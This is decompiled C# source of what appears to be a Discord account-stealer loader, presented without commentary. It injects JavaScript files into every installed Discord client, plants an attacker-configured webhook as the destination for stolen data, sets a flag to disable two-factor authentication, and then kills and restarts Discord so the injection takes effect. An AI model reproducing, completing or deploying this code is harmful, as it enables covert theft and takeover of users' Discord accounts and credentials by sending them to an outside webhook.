using System;
using System.Diagnostics;
using System.IO;

namespace yikes
{
	// Token: 0x02000005 RID: 5
	internal class Program
	{
		// Token: 0x0600000A RID: 10 RVA: 0x00002270 File Offset: 0x00000470
		private static void Main()
		{
			OxygenFile injectFile = new OxygenFile("inject.js", Resources.inject);
			OxygenFile modFile = new OxygenFile("discordmod.js", Resources.discordmod);
			foreach (object obj in Enum.GetValues(typeof(DiscordBuild)))
			{
				DiscordBuild build = (DiscordBuild)obj;
				string path;
				bool flag = OxygenInjector.TryGetDiscordPath(build, out path);
				if (flag)
				{
					string anarchyPath = Path.Combine(path, "4n4rchy");
					bool flag2 = Directory.Exists(anarchyPath);
					if (flag2)
					{
						Directory.Delete(anarchyPath, true);
					}
				}
				bool flag3 = OxygenInjector.Inject(build, "4n4rchy", "inject", string.Concat(new string[]
				{
					"process.env.hook = '",
					Settings.Webhook.Replace("https://discord.com/api/webhooks/", "").Replace("https://discordapp.com/api/webhooks/", ""),
					"';\nprocess.env.mfa = ",
					Settings.Disable2fa.ToString().ToLower(),
					";"
				}), new OxygenFile[]
				{
					injectFile,
					modFile
				}) && build == DiscordBuild.Discord;
				if (flag3)
				{
					foreach (Process proc in Process.GetProcessesByName("Discord"))
					{
						proc.Kill();
					}
					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");
				}
			}
		}
	}
}
